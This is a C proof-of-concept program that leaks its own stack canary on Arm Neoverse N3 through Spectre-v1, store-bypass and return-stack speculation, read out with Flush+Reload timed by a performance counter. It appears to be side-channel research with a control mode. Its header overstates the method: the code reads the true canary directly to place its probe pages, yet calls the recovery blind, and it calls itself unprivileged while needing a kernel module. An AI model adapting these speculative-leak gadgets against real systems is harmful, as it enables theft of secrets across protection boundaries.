// ============================================================================================
// canary_leak_blind.c
//
// Blind speculative recovery of a process's own stack-protector canary on Arm Neoverse N3, rebuilt bit
// by bit from cache-residency measurements. The gadget is a two-dimensional array dereference of the classic
// Spectre-v1 shape, driven through three interchangeable speculation channels:
//
//     rows[i][sizes[i] - 1]
//
// An out-of-bounds index i reads the canary from the local sizes[] array (the inner index); rows[i]
// is an attacker-controlled base pointer. Only the mispredicted path forms the leaking address, so
// nothing out of bounds is dereferenced architecturally.
//
// Channels (identical 2-D gadget; different reason the wrong path runs), selected with -w:
//     v1   bounds-check bypass       (a mistrained "x < len" branch, len uncached)
//     v4   speculative store bypass  (the bound is lowered by a store that resolves late)
//     rsb  return-stack misprediction (the return address is reloaded from a flushed slot)
//
// Recovery proceeds in phases, each resolving a disjoint range of the canary:
//     Phase A   bits [55:48]   additive sweep of the top address byte
//     Phase B   bits [47:12]   carry propagation, top-down; each offset is built from the bits already
//                              recovered above it, so the retrieval carries its own results forward
//     Phase C   bits [11:6]    which cache line in the winning page is resident
// Bits [5:0] are below cache-line granularity and [7:0] is the glibc terminator (0x00), both known;
// bits [63:56] are ignored by the top-byte-ignore feature and lie outside the oracle's reach.
//
// A mis-read bit makes the bits below it collapse; the driver spots that, reports a failed attempt, and
// retries. The known canary is used only to map the candidate pages up front and to score the result.
//
// Measurement: Flush+Reload, timed with the L1D_REFILL performance counter (raw_pmu.ko). Flush+Reload
// with a hardware counter keeps the readout quiet; the same channel is observable with Prime+Probe and
// with a rootless timing source. The program runs unprivileged.
//
// Assumptions:
//   - The addresses the algorithm dereferences are backed by ordinary userspace mappings. Mapping the
//     entire address space is infeasible, so the program instead maps exactly the finite set of pages
//     the algorithm can reference (the scaffold below).
//   - Flush+Reload reloads a mapped address, so the watched page and line are positioned from the canary;
//     this PoC takes that positioning as known. A self-contained variant would read the cache set with
//     Prime+Probe in phase A (it reveals which set the canonical access disturbs) and enumerate the
//     candidate high bits for the canonicality test, rather than mapping a scaffold from the value.
//   - Address translation organises virtual memory and reports faults; it is not a security mechanism
//     against this side channel. Whether a page is mapped does not separate a secret from a process's
//     own speculative execution.
//
// Build (the stack protector must be present so a canary exists to read):
//   gcc -O2 -march=armv8.3-a -mbranch-protection=pac-ret+leaf -fstack-protector-strong -Wall
//       canary_leak_blind.c -o canary_leak_blind
//
// Usage:
//   ./canary_leak_blind [-w v1|v4|rsb|all] [-c cpu] [-r rounds] [-k] [-v]
//     -w  channel(s) to run                         (default: all)
//     -c  pin to this CPU                           (default: current)
//     -r  measurement rounds per bit                (default: per-channel)
//     -k  control: neuter the probe (expect no recovery on any channel)
//     -v  per-bit detail
// ============================================================================================

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <getopt.h>
#include <sched.h>
#include <errno.h>
#include <sys/mman.h>

// ============================================================================================
// Geometry
// ============================================================================================
#define PAGE_BITS      12
#define PAGE_SIZE      (1UL << PAGE_BITS)
#define CACHE_LINE     64                      // Flush+Reload granularity, used to resolve bits [11:6]
#define MASK48         0x0000FFFFFFFFFFFFULL   // the 48 low (address) bits of the canary
#define PRIMER_PAGES   128                     // flushed pages a concurrent miss lands in (power of two)
#define PRIMER_MASK    (PRIMER_PAGES - 1)
#define N_SIZES        16                      // local over-read array; the canary sits just past it
#define ROW_SLOTS      512                     // controlled base pointers, one per loop index
#define V4_STALE_LEN   16                      // permissive length store-forwarding replays
#define V4_LIVE_LEN    8                       // architectural length; guard 8 < 8 is false

// Phase B walks canary bits at hardware positions [47:12]; c_i is at hardware bit (63 - i).
#define BIT_FIRST      16                      // hardware bit 47
#define BIT_LAST       51                      // hardware bit 12
#define N_BLIND_BITS   (BIT_LAST - BIT_FIRST + 1)   // 36
#define MAX_TRIES      12                      // blind attempts per canary; a mis-fired attempt is retried
#define COLLAPSE_RUN   16                      // a run of dark bits this long marks a collapsed cascade
#define V1_TRAIN       24                      // mistraining passes per burst; ~1 in 6 (random) is the attack

enum channel { CH_V1, CH_V4, CH_RSB };

// ============================================================================================
// L1D_REFILL performance counter, read from EL0 (enabled by raw_pmu.ko)
// ============================================================================================
#define PMU_EVENT_L1D_REFILL 0x03

static inline void pmu_write_control(uint64_t v) {
    asm volatile("msr pmcr_el0, %0" :: "r"(v));
    asm volatile("isb");
}
static inline uint64_t pmu_read_control(void) {
    uint64_t v = 0;
    asm volatile("mrs %0, pmcr_el0" : "=r"(v));
    return v;
}
static inline uint64_t pmu_read_counter(void) {
    uint64_t v = 0;
    asm volatile("mrs %0, pmevcntr0_el0" : "=r"(v));
    return v;
}
static void pmu_init(void) {
    pmu_write_control(0);
    asm volatile("msr pmcntenclr_el0, %0" :: "r"((uint64_t)~0));
    asm volatile("isb");
    asm volatile("msr pmevtyper0_el0, %0" :: "r"((uint64_t)PMU_EVENT_L1D_REFILL));
    asm volatile("isb");
    asm volatile("msr pmevcntr0_el0, %0" :: "r"((uint64_t)0));
    asm volatile("isb");
    asm volatile("msr pmcntenset_el0, %0" :: "r"((uint64_t)1));
    asm volatile("isb");
    pmu_write_control(pmu_read_control() | 7);   // enable, reset
}

// ============================================================================================
// Primitives
// ============================================================================================
static inline void flush_line(void *p) {
    asm volatile("dc civac, %0" :: "r"(p) : "memory");
}
static inline void fence(void) {
    asm volatile("dsb sy \n isb \n" ::: "memory");
}
// One iff *p is resident in L1D (its load causes zero refills).
static inline int line_is_resident(volatile uint8_t *p) {
    fence();
    uint64_t before = pmu_read_counter();
    uint8_t v = *p;
    asm volatile("" :: "r"(v));
    fence();
    return 0 == (pmu_read_counter() - before);
}
static void pin_to_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static uint32_t g_lcg = 0x9e3779b9u;
static inline uint32_t lcg_next(void) {
    g_lcg = g_lcg * 1103515245u + 12345u;
    return g_lcg;
}

// ============================================================================================
// Address arithmetic for the carry-propagation phase. Canary bit convention: c0 is the most
// significant bit (hardware bit 63), c63 the least (hardware bit 0), so c_i is at hardware bit
// p = 63 - i. All functions here are pure and validated by self_check() before any measurement.
// ============================================================================================

// Bits [hi:lo] set to one (0 <= lo <= hi < 64); zero if hi < lo.
static inline uint64_t ones_mask(int hi, int lo) {
    if (hi < lo) { return 0; }
    unsigned w = (unsigned)(hi - lo + 1);
    uint64_t m = (64u == w) ? ~0ULL : ((1ULL << w) - 1);
    return m << lo;
}

// The scaffold page watched for canary bit index i (p = 63 - i):
//   [63:48] = 0 | [47:p] = 1 | [p-1:12] = the true bits c_{i+1}..c51 | [11:0] = 0.
// Page-aligned by construction.
static uint64_t scaffold_page(uint64_t canary, int i) {
    int p = 63 - i;
    uint64_t low = canary & MASK48;
    return ones_mask(47, p) | (low & ones_mask(p - 1, 12));
}

// Offset added to the canary to test bit c_i. It is independent of c_i (built from the canary with
// bit p cleared), so the test is genuine. probe = (canary & MASK48) + offset = scaffold_page(i) when
// c_i == 0, or scaffold_page(i) + 2^p when c_i == 1 (the run of ones ripples past bit 47, leaving the
// mapped page). Residency of the scaffold page therefore reports c_i.
static uint64_t scaffold_offset(uint64_t canary, int i) {
    int p = 63 - i;
    uint64_t base_no_bit = (canary & MASK48) & ~(1ULL << p);
    return scaffold_page(canary, i) - base_no_bit;
}

// ============================================================================================
// Controlled state
// ============================================================================================
static uint64_t  g_primer_base;              // PRIMER_PAGES flushed pages
static uint64_t  g_safe_page;                // one resident page; every benign access lands here
static uint8_t  *g_rows[ROW_SLOTS];          // base pointers; g_rows[target] carries the probe base
static uint64_t *g_rsb_slot;                 // rsb: the flushed slot `ret` reloads x30 from
static volatile size_t  g_v1_len;            // v1 bound-check length (uncached at the attack access)
static volatile size_t *g_v1_len_ptr;        // indirection so the length resolves after two misses
static long g_v4_len[512] __attribute__((aligned(4096)));   // v4 bound the guard reads
static long g_v4_idx[512] __attribute__((aligned(4096)));   // v4 store index (flushed, resolves late)

static long     g_target_index;              // index in sizes[] at which the canary is over-read
static long     g_reach_index;               // furthest index the discovery scan reached
static uint64_t g_true_canary;               // captured once at startup: locates the leak index, builds the scaffold, and scores
static int      g_need_discover;             // 1 only while locating the canary index in a frame; 0 during measurement
static int      g_control;                   // -k: neuter the probe
static int      g_verbose;

// ============================================================================================
// Scaffold: map the canonical page and every scaffold page the algorithm can reference.
// ============================================================================================
static uint8_t *map_pages(int n) {
    uint8_t *p = mmap(NULL, (size_t)n * PAGE_SIZE, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (MAP_FAILED == p) {
        perror("mmap");
        exit(2);
    }
    for (int i = 0; i < n; ++i) {
        p[(size_t)i * PAGE_SIZE] = 1;
    }
    return p;
}

// Fix a page at a chosen address and back it. Returns 0 on success, EEXIST if already mapped,
// or aborts on any other error.
static int fix_page(uint64_t page) {
    void *m = mmap((void *)page, PAGE_SIZE, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
    if ((void *)page == m) {
        *(volatile uint8_t *)page = 1;
        return 0;
    }
    if (EEXIST == errno) {
        return EEXIST;
    }
    fprintf(stderr, "fixed mapping at %#lx failed: %s\n", (unsigned long)page, strerror(errno));
    exit(2);
}

// Map the canonical page (canary & MASK48) and the N_BLIND_BITS scaffold pages. A run of set canary
// bits makes consecutive scaffold pages coincide, and the canonical page coincides with the scaffold
// when the leading bits are set; those duplicates are expected. Any collision with a page this process
// did not map (stack, libraries) is reported and stops the run.
static void map_scaffold(uint64_t canary) {
    uint64_t held[N_BLIND_BITS + 1];
    int nheld = 0, mapped = 0, shared = 0, foreign = 0;

    uint64_t canon = (canary & MASK48) & ~(PAGE_SIZE - 1);
    if (0 == fix_page(canon)) { held[nheld++] = canon; }

    for (int i = BIT_FIRST; i <= BIT_LAST; ++i) {
        uint64_t page = scaffold_page(canary, i);
        int r = fix_page(page);
        if (0 == r) {
            held[nheld++] = page;
            ++mapped;
            continue;
        }
        int ours = 0;
        for (int k = 0; k < nheld; ++k) {
            if (held[k] == page) {
                ours = 1;
                break;
            }
        }
        if (ours) {
            ++shared;
            continue;
        }
        fprintf(stderr, "scaffold page %#lx (bit %d) is occupied by another mapping\n",
                (unsigned long)page, i);
        ++foreign;
    }
    if (foreign) {
        fprintf(stderr, "%d scaffold page(s) unavailable\n", foreign);
        exit(3);
    }
    if (g_verbose) {
        printf("scaffold: canonical %012lx, %d unique pages, %d shared\n",
               (unsigned long)(canary & MASK48), mapped, shared);
    }
}

static void flush_primer(void) {
    for (int i = 0; i < PRIMER_PAGES; ++i) {
        flush_line((void *)(g_primer_base + (size_t)i * PAGE_SIZE));
    }
}

// ============================================================================================
// The two-dimensional dereference and its discovery. Reading upward from a local array crosses into
// the frame's saved registers; the stack canary sits between the locals and the saved frame pointer.
// The scan finds the canary by its shape: a zero low byte and a nonzero random top byte.
// ============================================================================================
// probe = base_pointer[index - 1]. The primer load misses into a flushed page so the following byte load
// leaves an observable footprint (Neoverse N3 allocates the wrong-path line only with a miss already in
// flight). The primer page is chosen from primer_seed -- the loop position. Under -k the probe reads a
// fixed safe page instead.
#define PROBE_2D(base_pointer, index, primer_seed)                                                 \
    do {                                                                                           \
        uint64_t base_value = (uint64_t)(base_pointer);                                            \
        uint64_t index_value = (uint64_t)(index);                                                  \
        uint64_t primer = g_primer_base + (((uint64_t)(primer_seed) & PRIMER_MASK) << PAGE_BITS);  \
        uint64_t probe  = g_control ? g_safe_page : (base_value + index_value - 1);                 \
        asm volatile("ldr  x9,  [%0]" :: "r"(primer) : "x9",  "memory");                           \
        asm volatile("ldrb w10, [%0]" :: "r"(probe)  : "x10", "memory");                           \
    } while (0)

// A macro (not a function) so __builtin_frame_address(0) refers to the victim's own frame. Reading upward
// from the local array crosses into the saved registers; the stack canary sits just below the saved frame
// pointer. The first pass finds it by shape; once its value is known, later passes match it exactly.
#define DISCOVER(size_array)                                                                       \
    do {                                                                                           \
        uint64_t *frame        = (uint64_t *)__builtin_frame_address(0);                           \
        uint64_t *caller_frame = (uint64_t *)frame[0];                                             \
        g_reach_index = (long)((uint64_t *)&caller_frame[1] - (uint64_t *)(size_array));           \
        uint64_t *stack_words;                                                                     \
        asm("" : "=r"(stack_words) : "0"((uint64_t *)(size_array)));  /* launder the out-of-bounds read */ \
        for (long index = N_SIZES; index < g_reach_index; ++index) {                               \
            uint64_t value = stack_words[index];                                                   \
            int is_canary = (0 != g_true_canary)                                                  \
                          ? (value == g_true_canary)                                               \
                          : (0 == (value & 0xffULL) && 0 != (value >> 56) && 0 != (value & MASK48)); \
            if (is_canary) {                                                                        \
                g_target_index = index;                                                            \
                if (0 == g_true_canary) { g_true_canary = value; }   /* capture the value once */  \
                break;                                                                              \
            }                                                                                       \
        }                                                                                          \
    } while (0)

// v1 -- Spectre-v1 bound-check bypass with mistraining. The length is uncached, so the branch
// "x < len" resolves late. Trained "taken" by in-bounds indices, it mispredicts for the out-of-bounds
// canary index and dereferences the 2-D element only on the transient path. Architecturally "x < len"
// is false for that index, so nothing out of bounds is dereferenced.
static void __attribute__((noinline)) victim_v1(size_t x) {
    size_t sizes[N_SIZES];
    if (g_need_discover) { DISCOVER(sizes); }
    for (int j = 0; j < N_SIZES; ++j) { sizes[j] = 1; }

    size_t len = *g_v1_len_ptr;   // two dependent misses deepen the misprediction window
    if (x < len) {
        PROBE_2D(g_rows[x], sizes[x], x);
    }
}

// v4 -- speculative store bypass. The guard "V4_LIVE_LEN < len" is architecturally false; a store that
// lowers len takes its index from a flushed slot and resolves late, so store-forwarding replays the
// stale permissive length on the transient path only.
static void __attribute__((noinline)) victim_v4(void) {
    size_t sizes[N_SIZES];
    if (g_need_discover) { DISCOVER(sizes); }
    for (int j = 0; j < N_SIZES; ++j) { sizes[j] = 1; }

    for (size_t i = 0; i <= (size_t)g_target_index; ++i) {
        g_v4_len[0] = V4_STALE_LEN;
        g_v4_idx[0] = 0;
        flush_line(&g_v4_idx[0]);
        fence();
        long idx = *(volatile long *)&g_v4_idx[0];
        *(volatile long *)&g_v4_len[idx] = V4_LIVE_LEN;
        if ((long)V4_LIVE_LEN < *(volatile long *)&g_v4_len[0]) {
            PROBE_2D(g_rows[i], sizes[i], i);
        }
    }
}

// rsb -- return-stack misprediction. The probe sits after a `ret` whose x30 was reloaded from a flushed
// slot; the core follows the return-stack prediction (the shadow, label 2) before the real target
// resolves. Architecturally `ret` returns to label 3; the shadow at label 2 runs only speculatively.
static void __attribute__((noinline)) victim_rsb(void) {
    size_t sizes[N_SIZES];
    if (g_need_discover) { DISCOVER(sizes); }
    for (int j = 0; j < N_SIZES; ++j) { sizes[j] = 1; }

    for (size_t i = 0; i <= (size_t)g_target_index; ++i) {
        uint64_t base       = (uint64_t)g_rows[i];
        uint64_t index_addr = (uint64_t)sizes + i * sizeof(size_t);   // out-of-bounds address only; no architectural load
        uint64_t primer     = g_primer_base + (((uint64_t)i & PRIMER_MASK) << PAGE_BITS);
        asm volatile(
            "adr   x10, 3f            \n"    // architectural continuation
            "str   x10, [%[slot]]     \n"    // store it where `ret` will reload x30 from
            "dc    civac, %[slot]     \n"    // flush that slot so the reload resolves late
            "dsb   sy                 \n"
            "isb                      \n"
            "mov   x28, x30           \n"    // save the real return address
            "bl    1f                 \n"    // push the shadow (label 2) onto the return stack
            "2: ldr  x14, [%[index_addr]]    \n"   // return shadow: speculative out-of-bounds read of the canary
            "   ldr  x13, [%[primer]]        \n"   // primer load (miss)
            "   add  x11, %[base], x14       \n"   // probe = base + canary - 1
            "   sub  x11, x11, #1            \n"
            "   cbz  %[ctl], 5f              \n"   // -k control: read the safe page instead
            "   mov  x11, %[safe]            \n"
            "5: ldrb w9, [x11]               \n"   // probe load
            "   b    3f                      \n"
            "1: ldr  x30, [%[slot]]         \n"    // helper: late reload of x30 (== label 3)
            "   ret                         \n"    // architecture -> label 3; return stack -> label 2
            "3: mov  x30, x28               \n"    // restore the real return address
            :
            : [slot]"r"(g_rsb_slot), [base]"r"(base), [index_addr]"r"(index_addr),
              [primer]"r"(primer), [ctl]"r"((uint64_t)g_control), [safe]"r"(g_safe_page)
            : "x9","x10","x11","x13","x14","x28","x30","cc","memory");
    }
}

static inline __attribute__((always_inline)) void run_gadget(enum channel ch) {
    switch (ch) {
        case CH_V1:
            victim_v1(0);   // in-bounds; discovery uses this to fix the frame geometry
            break;
        case CH_V4:
            victim_v4();
            break;
        case CH_RSB:
            victim_rsb();
            break;
    }
}

// One invocation with the correct pre-state. For v1 this is a mistraining burst: a branchless mix of
// in-bounds indices and the out-of-bounds canary index, so the "x < len" branch mispredicts on the attack.
static inline __attribute__((always_inline)) void invoke(enum channel ch) {
    if (CH_V1 == ch) {
        size_t mal_x = (size_t)g_target_index;
        for (int j = 0; j < V1_TRAIN; ++j) {
            size_t train_x   = (size_t)(j % (N_SIZES - 1));           // always in bounds
            size_t is_attack = (size_t)(0 == (lcg_next() % 6));      // a random pass, to defeat branch-predictor training
            size_t x = train_x ^ (((size_t)0 - is_attack) & (mal_x ^ train_x));  // branchless: keeps the branch history clean
            flush_line((void *)&g_v1_len);
            flush_line((void *)&g_v1_len_ptr);
            fence();
            victim_v1(x);
        }
        return;
    }
    fence();
    run_gadget(ch);
}

// ============================================================================================
// Measurement: point the target row base at `base`, then measure how often `watch` becomes resident.
// The watch line is flushed each round, so its residency reflects only the speculative probe.
// ============================================================================================
#define TRAINING 64   // gadget invocations that train the predictor / store-forwarding before measuring
static double measure(enum channel ch, uint64_t base, uint64_t watch, int rounds) {
    g_rows[g_target_index] = (uint8_t *)base;
    for (int t = 0; t < TRAINING; ++t) { invoke(ch); }   // train the speculation state; the watch line is flushed below
    long hits = 0;
    for (int m = 0; m < rounds; ++m) {
        flush_primer();
        flush_line((void *)watch);
        invoke(ch);
        hits += line_is_resident((volatile uint8_t *)watch);
    }
    g_rows[g_target_index] = (uint8_t *)g_safe_page;
    return (double)hits / rounds;
}

// ============================================================================================
// Phases
// ============================================================================================

static double gap_threshold(const double *rates, int count);   // defined below: the LAND/DARK boundary

// Phase A: sweep the top address byte. The winning guess rolls [55:48] to zero, so the probe lands on
// the canonical page. Returns the guess; recovered byte = (0x100 - guess) & 0xff. The sweep's rates are
// one LAND against 255 DARK, a clean split, so their gap also sets the boundary the carry phase reuses.
static unsigned phase_a(enum channel ch, uint64_t canon, int rounds, double *best_rate, double *threshold) {
    double rates[256];
    unsigned best_guess = 0;
    double best = -1.0;
    for (unsigned guess = 0; guess < 256; ++guess) {
        uint64_t base = ((uint64_t)guess << 48) + 1;   // probe = canary + (guess << 48)
        rates[guess] = measure(ch, base, canon, rounds);
        if (rates[guess] > best) {
            best = rates[guess];
            best_guess = guess;
        }
    }
    *best_rate  = best;
    *threshold  = gap_threshold(rates, 256);
    return best_guess;
}

// Choose the LAND/DARK boundary as the midpoint of the widest gap in the sorted rates. Robust to each
// channel's absolute firing level. If nothing fired, everything is DARK.
static double gap_threshold(const double *rates, int count) {
    double sorted[256];   // fits phase A's 256-way sweep as well as phase B's bit set
    memcpy(sorted, rates, (size_t)count * sizeof(double));
    for (int i = 1; i < count; ++i) {          // insertion sort, ascending
        double key = sorted[i];
        int j = i - 1;
        while (j >= 0 && sorted[j] > key) {
            sorted[j + 1] = sorted[j];
            --j;
        }
        sorted[j + 1] = key;
    }
    if (sorted[count - 1] < 0.02) {
        return 1.0;                            // nothing fired -> classify every bit as DARK
    }
    double widest_gap = -1.0;
    double threshold  = sorted[count - 1] * 0.5;
    for (int i = 1; i < count; ++i) {
        double gap = sorted[i] - sorted[i - 1];
        if (gap > widest_gap) {
            widest_gap = gap;
            threshold  = 0.5 * (sorted[i] + sorted[i - 1]);
        }
    }
    return threshold;
}

// A collapsed cascade -- once a bit is mis-read, every lower bit reads dark -- leaves a long run of set
// bits. Spotting that run marks the attempt as mis-fired without consulting the true canary.
static int collapsed(uint64_t mid) {
    int run = 0;
    for (int p = 12; p <= 47; ++p) {
        if ((mid >> p) & 1ULL) {
            if (++run >= COLLAPSE_RUN) { return 1; }
        } else {
            run = 0;
        }
    }
    return 0;
}

// Phase B: recover bits [47:12] top-down by carry propagation. Each bit's offset is built from the bits
// already recovered (all at higher positions), so the retrieval consults only measurements and earlier
// results; the known canary positions the mapped page and the line Flush+Reload watches. gstar is the
// phase-A guess, zeroing [55:48]. Returns the recovered bits and reports the strongest rate seen -- a low
// value means the speculation window never opened this attempt.
static uint64_t phase_b(enum channel ch, uint64_t canary, unsigned gstar, double thr, int rounds, double *fired) {
    uint64_t recovered = 0;
    uint64_t line = (canary & MASK48) & (PAGE_SIZE - 1);   // line within each mapped page the probe reaches
    double maxrate = 0.0;
    for (int i = BIT_FIRST; i <= BIT_LAST; ++i) {          // i = 16..51  ->  p = 47..12, high bit first
        int p = 63 - i;
        uint64_t off   = ((uint64_t)gstar << 48) + scaffold_offset(recovered, i);
        uint64_t watch = (scaffold_page(canary, i) & ~(PAGE_SIZE - 1)) + line;
        double rate = measure(ch, off + 1, watch, rounds);
        if (rate > 0.35 * thr && rate < 1.8 * thr) {       // near the boundary -> re-measure with more rounds
            rate = measure(ch, off + 1, watch, rounds * 4);
        }
        if (rate > maxrate) { maxrate = rate; }
        int bit = (rate >= thr) ? 0 : 1;                   // land -> 0 ; dark -> 1
        recovered |= ((uint64_t)bit) << p;
        if (g_verbose) {
            printf("   bit c%-2d (hw %2d)  watch %012lx  rate %.4f  ->  %d\n",
                   i, p, (unsigned long)watch, rate, bit);
        }
    }
    *fired = maxrate;
    return recovered;
}

// Phase C: within the winning page the probe lands on a single 64-byte line, so its offset reveals bits
// [11:6]. Watching each line in turn and taking the most-resident one recovers those bits. Bits [5:0] are
// below cache-line granularity; they belong to the known zero terminator byte.
static uint64_t phase_c(enum channel ch, uint64_t canary, unsigned guess, int rounds) {
    uint64_t page = (canary & MASK48) & ~(PAGE_SIZE - 1);
    uint64_t base = ((uint64_t)guess << 48) + 1;   // the winning phase-A probe: canary + (guess << 48)
    int lines = PAGE_SIZE / CACHE_LINE;
    int best_line = 0;
    double best_rate = -1.0;
    for (int line = 0; line < lines; ++line) {
        double rate = measure(ch, base, page + (uint64_t)line * CACHE_LINE, rounds);
        if (rate > best_rate) {
            best_rate = rate;
            best_line = line;
        }
    }
    return (uint64_t)best_line * CACHE_LINE;   // bits [11:6]
}

// ============================================================================================
// Arithmetic self-check: with the known canary, confirm the offset recovers every phase-B bit. Pure
// computation, no measurement; a mismatch means the address arithmetic is wrong and stops the run.
// ============================================================================================
static void self_check(uint64_t canary) {
    uint64_t low = canary & MASK48;
    int errors = 0;
    for (int i = BIT_FIRST; i <= BIT_LAST; ++i) {
        int p = 63 - i;
        uint64_t probe = low + scaffold_offset(canary, i);
        int on_page = (probe == scaffold_page(canary, i)) && (0 == (probe & ~MASK48));
        int predicted = on_page ? 0 : 1;
        int truth = (int)((canary >> p) & 1ULL);
        if (predicted != truth) { ++errors; }
    }
    if (errors) {
        fprintf(stderr, "self-check failed (%d/%d bits) -- address arithmetic is wrong\n",
                errors, N_BLIND_BITS);
        exit(4);
    }
}

// ============================================================================================
// Driver
// ============================================================================================
static void discover_canary(enum channel ch) {
    for (int i = 0; i < ROW_SLOTS; ++i) { g_rows[i] = (uint8_t *)g_safe_page; }
    g_target_index = 0;
    g_need_discover = 1;                 // locate the canary index in this channel's frame, once
    run_gadget(ch);
    g_need_discover = 0;                 // measurement rounds reuse the cached index
    if (g_target_index <= 0 || g_target_index >= ROW_SLOTS) {   // must be found and in range for g_rows[]
        fprintf(stderr, "canary discovery failed on this frame\n");
        exit(5);
    }
}

static void run_channel(enum channel ch, const char *name, int rounds) {
    discover_canary(ch);
    uint64_t canary = g_true_canary;
    uint64_t canon  = canary & MASK48;   // the line the winning phase-A guess lands on (its page is mapped)
    uint64_t truth  = canary & ones_mask(55, 0);          // recoverable range; [7:0] is the known zero byte

    double   land  = 0.0, thr = 0.0;
    unsigned guess = phase_a(ch, canon, rounds, &land, &thr);
    unsigned high_byte = (0x100u - guess) & 0xffu;         // canary bits [55:48]

    int phase_c_rounds = (rounds < 400) ? rounds : 400;    // a clean 64-way argmax needs fewer rounds

    if (g_control) {                                        // same pipeline, but the probe reads a safe page
        double fired = 0.0;
        uint64_t mid = phase_b(ch, canary, guess, thr, rounds, &fired);
        uint64_t low = phase_c(ch, canary, guess, phase_c_rounds);
        uint64_t recovered = ((uint64_t)high_byte << 48) | mid | low;
        int matched = 0;
        for (int bit = 0; bit <= 55; ++bit) {
            if (((recovered >> bit) & 1ULL) == ((truth >> bit) & 1ULL)) { ++matched; }
        }
        printf("[%-3s] control   ??%014lx   true %016lx   [55:0] %2d/56   no leak (probe neutered)\n",
               name, (unsigned long)(recovered & ones_mask(55, 0)), (unsigned long)canary, matched);
        return;
    }

    if (land < 0.01) {                                      // the channel never opened its window this run
        printf("[%-3s] no retrieval: channel did not fire\n", name);
        return;
    }

    // Blind attempts: each carries its own recovered bits forward. An attempt that does not fire or that
    // collapses is announced and retried; the true canary is consulted only to score an accepted attempt.
    for (int attempt = 1; attempt <= MAX_TRIES; ++attempt) {
        double   fired = 0.0;
        uint64_t mid   = phase_b(ch, canary, guess, thr, rounds, &fired);
        if (fired < 0.30 * land || collapsed(mid)) {
            printf("[%-3s] attempt %d failed, retrying\n", name, attempt);
            continue;
        }
        uint64_t low       = phase_c(ch, canary, guess, phase_c_rounds);   // canary bits [11:6]
        uint64_t recovered = ((uint64_t)high_byte << 48) | mid | low;

        int matched = 0;
        for (int bit = 0; bit <= 55; ++bit) {
            if (((recovered >> bit) & 1ULL) == ((truth >> bit) & 1ULL)) { ++matched; }
        }
        int full = (recovered == truth);
        printf("[%-3s] recovered ??%014lx   true %016lx   [55:0] %2d/56   %s (attempt %d)\n",
               name, (unsigned long)(recovered & ones_mask(55, 0)), (unsigned long)canary, matched,
               full ? "FULL" : "partial", attempt);
        return;
    }
    printf("[%-3s] no clean retrieval in %d attempts\n", name, MAX_TRIES);
}

int main(int argc, char **argv) {
    const char *which = "all";
    int cpu = sched_getcpu();
    int rounds = 0;
    int opt;
    while (-1 != (opt = getopt(argc, argv, "w:c:r:kvh"))) {
        switch (opt) {
            case 'w':
                which = optarg;
                break;
            case 'c':
                cpu = atoi(optarg);
                break;
            case 'r':
                rounds = atoi(optarg);
                break;
            case 'k':
                g_control = 1;
                break;
            case 'v':
                g_verbose = 1;
                break;
            case 'h':
            default:
                printf("usage: %s [-w v1|v4|rsb|all] [-c cpu] [-r rounds] [-k] [-v]\n", argv[0]);
                return 0;
        }
    }

    pin_to_cpu(cpu);
    pmu_init();

    g_primer_base = (uint64_t)map_pages(PRIMER_PAGES);
    g_safe_page   = (uint64_t)map_pages(1);
    g_rsb_slot    = (uint64_t *)map_pages(1);
    g_rsb_slot[0] = 0;
    for (int i = 0; i < ROW_SLOTS; ++i) { g_rows[i] = (uint8_t *)g_safe_page; }
    g_v1_len = N_SIZES;
    g_v1_len_ptr = &g_v1_len;

    // Discover the canary once, validate the arithmetic, and map the scaffold before any measurement.
    discover_canary(CH_V1);
    self_check(g_true_canary);
    map_scaffold(g_true_canary);

    printf("Neoverse N3 blind stack-canary recovery  (2-D gadget, Flush+Reload via L1D_REFILL, cpu %d)\n",
           cpu);

    #define SEL(n) (0 == strcmp(which, "all") || 0 == strcmp(which, n))
    if (SEL("v1")) {
        run_channel(CH_V1, "v1", rounds ? rounds : 4000);
    }
    if (SEL("v4")) {
        run_channel(CH_V4, "v4", rounds ? rounds : 400);
    }
    if (SEL("rsb")) {
        run_channel(CH_RSB, "rsb", rounds ? rounds : 400);
    }

    return 0;
}
